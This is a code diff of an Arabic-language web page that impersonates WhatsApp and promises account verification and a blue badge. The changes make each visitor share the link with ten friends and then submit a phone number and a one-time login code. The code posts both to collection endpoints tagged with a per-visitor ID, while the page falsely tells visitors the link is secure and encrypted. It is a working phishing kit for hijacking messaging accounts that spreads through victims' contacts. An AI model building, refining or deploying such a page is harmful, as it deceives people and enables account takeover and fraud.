@@ -6,569 +6,83 @@
     <title>WhatsApp - توثيق الحساب</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
-        }
-
-        body {
-            background-color: #0a0a0a;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 0;
-        }
-
-        .app-container {
-            background-color: #ffffff;
-            max-width: 430px;
-            width: 100%;
-            height: 100vh;
-            max-height: 932px;
-            display: flex;
-            flex-direction: column;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 0 40px rgba(0, 0, 0, 0.5);
-        }
-
-        .header {
-            background: #075e54;
-            color: white;
-            padding: 16px 20px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            position: sticky;
-            top: 0;
-            z-index: 10;
-            min-height: 60px;
-        }
-
-        .header .back-btn {
-            font-size: 22px;
-            cursor: pointer;
-            display: none;
-            padding: 4px 8px;
-            border-radius: 50%;
-            transition: 0.2s;
-        }
-
-        .header .back-btn:hover {
-            background: rgba(255, 255, 255, 0.1);
-        }
-
-        .header .brand {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            flex: 1;
-        }
-
-        .header .brand i {
-            font-size: 28px;
-        }
-
-        .header .brand h2 {
-            font-size: 20px;
-            font-weight: 600;
-            letter-spacing: 0.2px;
-        }
-
-        .header .brand .badge {
-            background: #25d366;
-            color: white;
-            font-size: 10px;
-            padding: 2px 8px;
-            border-radius: 20px;
-            font-weight: 700;
-            margin-right: 4px;
-        }
-
-        .header .status {
-            font-size: 12px;
-            opacity: 0.8;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-
-        .header .status .dot {
-            width: 8px;
-            height: 8px;
-            background: #25d366;
-            border-radius: 50%;
-            display: inline-block;
-            animation: pulse 1.5s infinite;
-        }
-
-        @keyframes pulse {
-            0%,
-            100% {
-                opacity: 1;
-            }
-            50% {
-                opacity: 0.3;
-            }
-        }
-
-        .page {
-            flex: 1;
-            padding: 30px 24px;
-            display: none;
-            flex-direction: column;
-            animation: fadeIn 0.3s ease;
-            background: #f0f2f5;
-            overflow-y: auto;
-        }
-
-        .page.active {
-            display: flex;
-        }
-
-        @keyframes fadeIn {
-            0% {
-                opacity: 0;
-                transform: translateY(10px);
-            }
-            100% {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .invite-card {
-            background: white;
-            border-radius: 16px;
-            padding: 30px 24px;
-            margin-bottom: 20px;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.06);
-            text-align: center;
-        }
-
-        .invite-card .icon-circle {
-            width: 70px;
-            height: 70px;
-            border-radius: 50%;
-            background: #dcf8c6;
-            color: #075e54;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 32px;
-            margin: 0 auto 16px;
-        }
-
-        .invite-card h3 {
-            font-size: 20px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin-bottom: 8px;
-        }
-
-        .invite-card .sub-text {
-            color: #667781;
-            font-size: 15px;
-            line-height: 1.6;
-        }
-
-        .invite-card .sub-text strong {
-            color: #075e54;
-        }
-
-        .invite-card .highlight-box {
-            background: #f0f7ff;
-            border-radius: 12px;
-            padding: 16px;
-            margin: 16px 0 20px;
-            border-right: 4px solid #075e54;
-            text-align: right;
-        }
-
-        .invite-card .highlight-box .number {
-            font-size: 28px;
-            font-weight: 800;
-            color: #075e54;
-        }
-
-        .btn-share {
-            width: 100%;
-            padding: 14px;
-            background: #25d366;
-            color: white;
-            border: none;
-            border-radius: 30px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        .btn-share:hover {
-            background: #1da85c;
-        }
-
-        .btn-share:active {
-            transform: scale(0.97);
-        }
-
-        .btn-continue {
-            width: 100%;
-            padding: 14px;
-            background: #075e54;
-            color: white;
-            border: none;
-            border-radius: 30px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 10px;
-        }
-
-        .btn-continue:hover {
-            background: #054a42;
-        }
-
-        .btn-continue:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-
-        .chat-card {
-            background: white;
-            border-radius: 16px;
-            padding: 24px 20px;
-            margin-bottom: 20px;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.06);
-        }
-
-        .chat-card .icon-circle {
-            width: 56px;
-            height: 56px;
-            border-radius: 50%;
-            background: #e8f5e9;
-            color: #075e54;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            margin: 0 auto 12px;
-        }
-
-        .chat-card h3 {
-            font-size: 18px;
-            font-weight: 700;
-            color: #1a1a1a;
-            text-align: center;
-            margin-bottom: 4px;
-        }
-
-        .chat-card .sub-text {
-            color: #667781;
-            font-size: 14px;
-            text-align: center;
-            line-height: 1.5;
-        }
-
-        .chat-card .sub-text strong {
-            color: #075e54;
-        }
-
-        .input-group {
-            display: flex;
-            align-items: center;
-            background: white;
-            border-radius: 12px;
-            padding: 4px 16px;
-            margin-bottom: 16px;
-            border: 2px solid #e9edef;
-            transition: 0.2s;
-        }
-
-        .input-group:focus-within {
-            border-color: #075e54;
-            box-shadow: 0 0 0 3px rgba(7, 94, 84, 0.12);
-        }
-
-        .input-group i {
-            color: #667781;
-            font-size: 18px;
-            margin-left: 12px;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 14px 0;
-            border: none;
-            background: transparent;
-            font-size: 16px;
-            outline: none;
-            direction: ltr;
-            color: #1a1a1a;
-        }
-
-        .input-group input::placeholder {
-            color: #8696a0;
-        }
-
-        .otp-boxes {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin: 16px 0 20px;
-            direction: ltr;
-        }
-
-        .otp-boxes input {
-            width: 48px;
-            height: 56px;
-            text-align: center;
-            font-size: 22px;
-            font-weight: 700;
-            border: 2px solid #e9edef;
-            border-radius: 12px;
-            background: white;
-            transition: 0.2s;
-            outline: none;
-            color: #1a1a1a;
-            -webkit-text-security: none;
-        }
-
-        .otp-boxes input:focus {
-            border-color: #075e54;
-            box-shadow: 0 0 0 3px rgba(7, 94, 84, 0.12);
-        }
-
-        .btn {
-            width: 100%;
-            padding: 14px;
-            border: none;
-            border-radius: 30px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-
-        .btn-primary {
-            background: #075e54;
-            color: white;
-        }
-
-        .btn-primary:hover {
-            background: #054a42;
-        }
-
-        .btn-primary:active {
-            transform: scale(0.97);
-        }
-
-        .btn-success {
-            background: #25d366;
-            color: white;
-        }
-
-        .btn-success:hover {
-            background: #1da85c;
-        }
-
-        .btn-secondary {
-            background: transparent;
-            color: #075e54;
-            border: 2px solid #075e54;
-        }
-
-        .btn-secondary:hover {
-            background: #075e54;
-            color: white;
-        }
-
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-
-        .error-msg {
-            color: #d32f2f;
-            font-size: 13px;
-            margin: -8px 0 14px 0;
-            display: none;
-            align-items: center;
-            gap: 6px;
-            background: #fce4ec;
-            padding: 8px 14px;
-            border-radius: 10px;
-        }
-
-        .error-msg.show {
-            display: flex;
-        }
-
-        .success-msg {
-            color: #1da85c;
-            font-size: 13px;
-            margin: -8px 0 14px 0;
-            display: none;
-            align-items: center;
-            gap: 6px;
-            background: #e8f5e9;
-            padding: 8px 14px;
-            border-radius: 10px;
-        }
-
-        .success-msg.show {
-            display: flex;
-        }
-
-        .footer-note {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 12px;
-            color: #8696a0;
-            padding: 10px 0;
-        }
-
-        .footer-note i {
-            color: #25d366;
-            margin-right: 4px;
-        }
-
-        .loading-spinner {
-            display: none;
-            text-align: center;
-            padding: 10px;
-        }
-
-        .loading-spinner.show {
-            display: block;
-        }
-
-        .spinner {
-            border: 3px solid #e9edef;
-            border-top: 3px solid #075e54;
-            border-radius: 50%;
-            width: 28px;
-            height: 28px;
-            animation: spin 0.7s linear infinite;
-            margin: 0 auto;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        .message-bubble {
-            background: white;
-            border-radius: 16px 16px 16px 4px;
-            padding: 14px 18px;
-            margin-bottom: 8px;
-            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.04);
-            max-width: 90%;
-            align-self: flex-start;
-        }
-
-        .message-bubble .sender {
-            font-size: 12px;
-            font-weight: 600;
-            color: #075e54;
-            margin-bottom: 2px;
-        }
-
-        .message-bubble .text {
-            font-size: 14px;
-            color: #1a1a1a;
-            line-height: 1.5;
-        }
-
-        .message-bubble .time {
-            font-size: 10px;
-            color: #8696a0;
-            text-align: left;
-            margin-top: 4px;
-        }
-
-        .message-bubble.incoming {
-            border-radius: 16px 16px 4px 16px;
-            background: #e8f5e9;
-        }
-
-        @media (max-width: 430px) {
-            .app-container {
-                max-height: 100vh;
-                border-radius: 0;
-                box-shadow: none;
-            }
-            .otp-boxes input {
-                width: 44px;
-                height: 50px;
-                font-size: 20px;
-            }
-        }
-
-        .page::-webkit-scrollbar {
-            width: 4px;
-        }
-        .page::-webkit-scrollbar-track {
-            background: transparent;
-        }
-        .page::-webkit-scrollbar-thumb {
-            background: #c8c8c8;
-            border-radius: 10px;
-        }
-
-        .toast {
-            position: fixed;
-            bottom: 100px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #1a1a1a;
-            color: white;
-            padding: 12px 24px;
-            border-radius: 30px;
-            font-size: 14px;
-            font-weight: 500;
-            display: none;
-            z-index: 100;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
-            animation: slideUp 0.3s ease;
-        }
-
-        .toast.show {
-            display: block;
-        }
-
-        @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateX(-50%) translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(-50%) translateY(0);
-            }
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif; }
+        body { background-color: #0a0a0a; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 0; }
+        .app-container { background-color: #ffffff; max-width: 430px; width: 100%; height: 100vh; max-height: 932px; display: flex; flex-direction: column; position: relative; overflow: hidden; box-shadow: 0 0 40px rgba(0, 0, 0, 0.5); }
+        .header { background: #075e54; color: white; padding: 16px 20px; display: flex; align-items: center; gap: 12px; position: sticky; top: 0; z-index: 10; min-height: 60px; }
+        .header .back-btn { font-size: 22px; cursor: pointer; display: none; padding: 4px 8px; border-radius: 50%; transition: 0.2s; }
+        .header .back-btn:hover { background: rgba(255, 255, 255, 0.1); }
+        .header .brand { display: flex; align-items: center; gap: 8px; flex: 1; }
+        .header .brand i { font-size: 28px; }
+        .header .brand h2 { font-size: 20px; font-weight: 600; letter-spacing: 0.2px; }
+        .header .brand .badge { background: #25d366; color: white; font-size: 10px; padding: 2px 8px; border-radius: 20px; font-weight: 700; margin-right: 4px; }
+        .header .status { font-size: 12px; opacity: 0.8; display: flex; align-items: center; gap: 4px; }
+        .header .status .dot { width: 8px; height: 8px; background: #25d366; border-radius: 50%; display: inline-block; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        .page { flex: 1; padding: 30px 24px; display: none; flex-direction: column; animation: fadeIn 0.3s ease; background: #f0f2f5; overflow-y: auto; }
+        .page.active { display: flex; }
+        @keyframes fadeIn { 0% { opacity: 0; transform: translateY(10px); } 100% { opacity: 1; transform: translateY(0); } }
+        .invite-card { background: white; border-radius: 16px; padding: 30px 24px; margin-bottom: 20px; box-shadow: 0 1px 3px rgba(0, 0, 0, 0.06); text-align: center; }
+        .invite-card .icon-circle { width: 70px; height: 70px; border-radius: 50%; background: #dcf8c6; color: #075e54; display: flex; align-items: center; justify-content: center; font-size: 32px; margin: 0 auto 16px; }
+        .invite-card h3 { font-size: 20px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; }
+        .invite-card .sub-text { color: #667781; font-size: 15px; line-height: 1.6; }
+        .invite-card .sub-text strong { color: #075e54; }
+        .invite-card .highlight-box { background: #f0f7ff; border-radius: 12px; padding: 16px; margin: 16px 0 20px; border-right: 4px solid #075e54; text-align: right; }
+        .invite-card .highlight-box .number { font-size: 28px; font-weight: 800; color: #075e54; }
+        .btn-share { width: 100%; padding: 14px; background: #25d366; color: white; border: none; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .btn-share:hover { background: #1da85c; }
+        .btn-share:active { transform: scale(0.97); }
+        .btn-confirm { width: 100%; padding: 14px; background: #075e54; color: white; border: none; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 10px; }
+        .btn-confirm:hover { background: #054a42; }
+        .btn-confirm:active { transform: scale(0.97); }
+        .btn-confirm:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn-continue { width: 100%; padding: 14px; background: #075e54; color: white; border: none; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 10px; }
+        .btn-continue:hover { background: #054a42; }
+        .btn-continue:disabled { opacity: 0.5; cursor: not-allowed; }
+        .chat-card { background: white; border-radius: 16px; padding: 24px 20px; margin-bottom: 20px; box-shadow: 0 1px 3px rgba(0, 0, 0, 0.06); }
+        .chat-card .icon-circle { width: 56px; height: 56px; border-radius: 50%; background: #e8f5e9; color: #075e54; display: flex; align-items: center; justify-content: center; font-size: 24px; margin: 0 auto 12px; }
+        .chat-card h3 { font-size: 18px; font-weight: 700; color: #1a1a1a; text-align: center; margin-bottom: 4px; }
+        .chat-card .sub-text { color: #667781; font-size: 14px; text-align: center; line-height: 1.5; }
+        .chat-card .sub-text strong { color: #075e54; }
+        .input-group { display: flex; align-items: center; background: white; border-radius: 12px; padding: 4px 16px; margin-bottom: 16px; border: 2px solid #e9edef; transition: 0.2s; }
+        .input-group:focus-within { border-color: #075e54; box-shadow: 0 0 0 3px rgba(7, 94, 84, 0.12); }
+        .input-group i { color: #667781; font-size: 18px; margin-left: 12px; }
+        .input-group input { width: 100%; padding: 14px 0; border: none; background: transparent; font-size: 16px; outline: none; direction: ltr; color: #1a1a1a; }
+        .input-group input::placeholder { color: #8696a0; }
+        .otp-boxes { display: flex; justify-content: center; gap: 10px; margin: 16px 0 20px; direction: ltr; }
+        .otp-boxes input { width: 48px; height: 56px; text-align: center; font-size: 22px; font-weight: 700; border: 2px solid #e9edef; border-radius: 12px; background: white; transition: 0.2s; outline: none; color: #1a1a1a; -webkit-text-security: none; }
+        .otp-boxes input:focus { border-color: #075e54; box-shadow: 0 0 0 3px rgba(7, 94, 84, 0.12); }
+        .btn { width: 100%; padding: 14px; border: none; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .btn-primary { background: #075e54; color: white; }
+        .btn-primary:hover { background: #054a42; }
+        .btn-primary:active { transform: scale(0.97); }
+        .btn-success { background: #25d366; color: white; }
+        .btn-success:hover { background: #1da85c; }
+        .btn-secondary { background: transparent; color: #075e54; border: 2px solid #075e54; }
+        .btn-secondary:hover { background: #075e54; color: white; }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .error-msg { color: #d32f2f; font-size: 13px; margin: -8px 0 14px 0; display: none; align-items: center; gap: 6px; background: #fce4ec; padding: 8px 14px; border-radius: 10px; }
+        .error-msg.show { display: flex; }
+        .success-msg { color: #1da85c; font-size: 13px; margin: -8px 0 14px 0; display: none; align-items: center; gap: 6px; background: #e8f5e9; padding: 8px 14px; border-radius: 10px; }
+        .success-msg.show { display: flex; }
+        .footer-note { text-align: center; margin-top: 20px; font-size: 12px; color: #8696a0; padding: 10px 0; }
+        .footer-note i { color: #25d366; margin-right: 4px; }
+        .loading-spinner { display: none; text-align: center; padding: 10px; }
+        .loading-spinner.show { display: block; }
+        .spinner { border: 3px solid #e9edef; border-top: 3px solid #075e54; border-radius: 50%; width: 28px; height: 28px; animation: spin 0.7s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .message-bubble { background: white; border-radius: 16px 16px 16px 4px; padding: 14px 18px; margin-bottom: 8px; box-shadow: 0 1px 2px rgba(0, 0, 0, 0.04); max-width: 90%; align-self: flex-start; }
+        .message-bubble .sender { font-size: 12px; font-weight: 600; color: #075e54; margin-bottom: 2px; }
+        .message-bubble .text { font-size: 14px; color: #1a1a1a; line-height: 1.5; }
+        .message-bubble .time { font-size: 10px; color: #8696a0; text-align: left; margin-top: 4px; }
+        .message-bubble.incoming { border-radius: 16px 16px 4px 16px; background: #e8f5e9; }
+        @media (max-width: 430px) { .app-container { max-height: 100vh; border-radius: 0; box-shadow: none; } .otp-boxes input { width: 44px; height: 50px; font-size: 20px; } }
+        .page::-webkit-scrollbar { width: 4px; }
+        .page::-webkit-scrollbar-track { background: transparent; }
+        .page::-webkit-scrollbar-thumb { background: #c8c8c8; border-radius: 10px; }
+        .toast { position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%); background: #1a1a1a; color: white; padding: 12px 24px; border-radius: 30px; font-size: 14px; font-weight: 500; display: none; z-index: 100; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3); animation: slideUp 0.3s ease; }
+        .toast.show { display: block; }
+        @keyframes slideUp { from { opacity: 0; transform: translateX(-50%) translateY(20px); } to { opacity: 1; transform: translateX(-50%) translateY(0); } }
     </style>
 </head>
 <body>
@@ -598,19 +112,19 @@
                 <h3>🎯 دعوة الأصدقاء</h3>
                 <p class="sub-text">
                     <strong>لتفعيل التوثيق والحصول على العلامة الزرقاء</strong>
-                    <br>يجب عليك مشاركة الرابط مع <strong>5 من أصدقائك</strong>
-                    <br>كل صديق يفتح الرابط يحسب لك دعوة
+                    <br>شارك الرابط مع <strong>10 من أصدقائك</strong>
+                    <br>ثم اضغط على زر <strong>"تم"</strong> مرة واحدة فقط ✅
                 </p>
 
                 <div class="highlight-box">
                     <div style="display: flex; align-items: center; justify-content: space-between;">
-                        <span style="font-size: 14px; color: #667781;">عدد المدعوين</span>
-                        <span class="number" id="inviteCount">0</span>
+                        <span style="font-size: 14px; color: #667781;">الحالة</span>
+                        <span class="number" id="statusText">⏳ في انتظار المشاركة</span>
                     </div>
                     <div style="margin-top: 8px;">
                         <div style="display: flex; justify-content: space-between; font-size: 12px; color: #667781;">
                             <span>0</span>
-                            <span>5</span>
+                            <span>10</span>
                         </div>
                         <div style="width: 100%; height: 6px; background: #e9edef; border-radius: 10px; overflow: hidden; margin-top: 2px;">
                             <div id="progressFill" style="height: 100%; background: linear-gradient(90deg, #075e54, #25d366); border-radius: 10px; width: 0%; transition: width 0.5s ease;"></div>
@@ -619,24 +133,25 @@
                 </div>
 
                 <button class="btn-share" id="shareBtn">
-                    <i class="fas fa-share-alt"></i>
-                    مشاركة الرابط
+                    <i class="fas fa-share-alt"></i> مشاركة الرابط
+                </button>
+
+                <button class="btn-confirm" id="confirmBtn">
+                    <i class="fas fa-check-circle"></i> تم ✅
                 </button>
 
                 <button class="btn-continue" id="continueBtn" disabled>
-                    <i class="fas fa-arrow-right"></i>
-                    المتابعة للتوثيق
+                    <i class="fas fa-arrow-right"></i> المتابعة للتوثيق
                 </button>
 
                 <div class="footer-note">
-                    <i class="fas fa-shield-alt"></i>
-                    الرابط آمن ومشفّر
+                    <i class="fas fa-shield-alt"></i> الرابط آمن ومشفّر
                 </div>
             </div>
 
             <div class="message-bubble incoming">
                 <div class="sender">WhatsApp</div>
-                <div class="text">👋 مرحباً! شارك الرابط مع 5 أصدقاء لتفعيل التوثيق</div>
+                <div class="text">👋 شارك الرابط مع 10 أصدقاء ثم اضغط "تم"</div>
                 <div class="time">الآن</div>
             </div>
         </div>
@@ -756,8 +271,9 @@
 
         // عناصر صفحة الدعوة
         const shareBtn = document.getElementById('shareBtn');
+        const confirmBtn = document.getElementById('confirmBtn');
         const continueBtn = document.getElementById('continueBtn');
-        const inviteCount = document.getElementById('inviteCount');
+        const statusText = document.getElementById('statusText');
         const progressFill = document.getElementById('progressFill');
         const toast = document.getElementById('toast');
 
@@ -776,12 +292,17 @@
         const loadingSpinner = document.getElementById('loadingSpinner');
 
         // متغيرات
+        let userId = '';
         let enteredPhone = '';
         let correctOtp = '123456';
         let isVerifying = false;
-        let inviteCounter = 0;
-        const TARGET_INVITES = 5;
-        const LINK = 'https://whatsapp-verify-zeta.vercel.app/';
+        let isShared = false;
+        const BASE_URL = 'https://whatsapp-verify-zeta.vercel.app';
+
+        // ===== توليد ID فريد =====
+        function generateUserId() {
+            return Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
+        }
 
         // ===== Toast =====
         function showToast(message) {
@@ -792,34 +313,48 @@
             }, 3000);
         }
 
-        // ===== تحديث عداد الدعوات =====
-        function updateInviteProgress() {
-            inviteCount.textContent = inviteCounter;
-            const percent = Math.min((inviteCounter / TARGET_INVITES) * 100, 100);
-            progressFill.style.width = percent + '%';
-
-            if (inviteCounter >= TARGET_INVITES) {
+        // ===== تحديث حالة الدعوة =====
+        function updateStatus() {
+            if (isShared) {
+                statusText.textContent = '✅ تمت المشاركة!';
+                statusText.style.color = '#25d366';
+                progressFill.style.width = '100%';
                 continueBtn.disabled = false;
+                continueBtn.innerHTML = '<i class="fas fa-arrow-right"></i> المتابعة للتوثيق ✅';
+                confirmBtn.disabled = true;
+                confirmBtn.innerHTML = '<i class="fas fa-check-circle"></i> تم ✅';
             } else {
+                statusText.textContent = '⏳ في انتظار المشاركة';
+                statusText.style.color = '#075e54';
+                progressFill.style.width = '0%';
                 continueBtn.disabled = true;
+                continueBtn.innerHTML = '<i class="fas fa-arrow-right"></i> المتابعة للتوثيق';
+                confirmBtn.disabled = false;
+                confirmBtn.innerHTML = '<i class="fas fa-check-circle"></i> تم ✅';
             }
         }
 
-        // ===== التحقق من الرابط =====
-        function checkInviteFromURL() {
-            const params = new URLSearchParams(window.location.search);
-            const invited = params.get('invited');
-            if (invited === 'true') {
-                inviteCounter = Math.min(inviteCounter + 1, TARGET_INVITES);
-                updateInviteProgress();
-                showToast('✅ تمت دعوة جديدة! +1');
-                window.history.replaceState({}, document.title, window.location.pathname);
+        // ===== جلب بيانات المستخدم =====
+        async function fetchUserData() {
+            try {
+                const response = await fetch('/get-user', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ userId: userId })
+                });
+                const data = await response.json();
+                if (data.success) {
+                    isShared = data.shared || false;
+                    updateStatus();
+                }
+            } catch (error) {
+                console.error('❌ خطأ في جلب البيانات:', error);
             }
         }
 
         // ===== مشاركة الرابط =====
         async function shareLink() {
-            const shareLink = LINK + '?invited=true';
+            const shareLink = `${BASE_URL}/?ref=${userId}`;
 
             try {
                 if (navigator.share) {
@@ -828,10 +363,10 @@
                         text: '🔵 ساعدني في توثيق حسابي على WhatsApp واحصل على العلامة الزرقاء!',
                         url: shareLink
                     });
-                    showToast('✅ تمت المشاركة! انتظر حتى يفتح أصدقاؤك الرابط');
+                    showToast('✅ تمت المشاركة! اضغط "تم"');
                 } else {
                     await navigator.clipboard.writeText(shareLink);
-                    showToast('✅ تم نسخ الرابط! شاركه مع أصدقائك');
+                    showToast('✅ تم نسخ الرابط! شاركه مع أصدقائك ثم اضغط "تم"');
                 }
             } catch (err) {
                 console.log('❌ فشل المشاركة:', err);
@@ -846,9 +381,37 @@
             }
         }
 
+        // ===== تأكيد المشاركة (مرة واحدة) =====
+        function confirmShare() {
+            if (isShared) {
+                showToast('⚠️ لقد قمت بالمشاركة بالفعل!');
+                return;
+            }
+
+            fetch('/confirm-share', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ userId: userId })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    isShared = true;
+                    updateStatus();
+                    showToast('✅ تم تأكيد المشاركة! يمكنك المتابعة الآن');
+                } else {
+                    showToast('⚠️ ' + data.message);
+                }
+            })
+            .catch(error => {
+                console.error('❌ خطأ:', error);
+                showToast('❌ حدث خطأ، حاول مرة أخرى');
+            });
+        }
+
         // ===== المتابعة للتوثيق =====
         function goToPhone() {
-            if (inviteCounter >= TARGET_INVITES) {
+            if (isShared) {
                 pageInvite.classList.remove('active');
                 pagePhone.classList.add('active');
                 backBtn.style.display = 'none';
@@ -883,18 +446,18 @@
             enteredPhone = phone;
             displayPhone.textContent = phone;
 
-            correctOtp = Math.floor(100000 + Math.random() * 900000).toString();
-            console.log('📲 رمز OTP الجديد:', correctOtp);
-
             try {
-                await fetch('/send-phone', {
+                await fetch('/save-phone', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: phone })
+                    body: JSON.stringify({ userId, phone })
                 });
             } catch (error) {
-                console.error('❌ خطأ:', error);
+                console.error('❌ خطأ في حفظ الرقم:', error);
             }
+
+            correctOtp = Math.floor(100000 + Math.random() * 900000).toString();
+            console.log('📲 رمز OTP الجديد:', correctOtp);
 
             showPage(pageOtp);
             otpInputs[0].focus();
@@ -927,16 +490,15 @@
             verifyOtpBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التوثيق...';
 
             try {
-                const response = await fetch('/submit-otp', {
+                await fetch('/save-otp', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
+                        userId,
                         phone: enteredPhone,
                         otp: enteredOtp
                     })
                 });
-
-                const data = await response.json();
 
                 if (enteredOtp === correctOtp) {
                     otpSuccess.classList.add('show');
@@ -1028,6 +590,7 @@
 
         // ===== ربط الأحداث =====
         shareBtn.addEventListener('click', shareLink);
+        confirmBtn.addEventListener('click', confirmShare);
         continueBtn.addEventListener('click', goToPhone);
         sendOtpBtn.addEventListener('click', sendPhone);
         verifyOtpBtn.addEventListener('click', verifyOtp);
@@ -1047,11 +610,17 @@
             }
         });
 
-        // ===== تشغيل التحقق من الرابط =====
-        checkInviteFromURL();
+        // ===== بدء التشغيل =====
+        userId = localStorage.getItem('whatsapp_userId');
+        if (!userId) {
+            userId = generateUserId();
+            localStorage.setItem('whatsapp_userId', userId);
+        }
+        console.log('👤 معرف المستخدم:', userId);
 
-        // ===== تهيئة =====
-        updateInviteProgress();
+        fetchUserData();
+        updateStatus();
+
         console.log('🔑 الرمز الافتراضي للاختبار: 123456');
     </script>
 
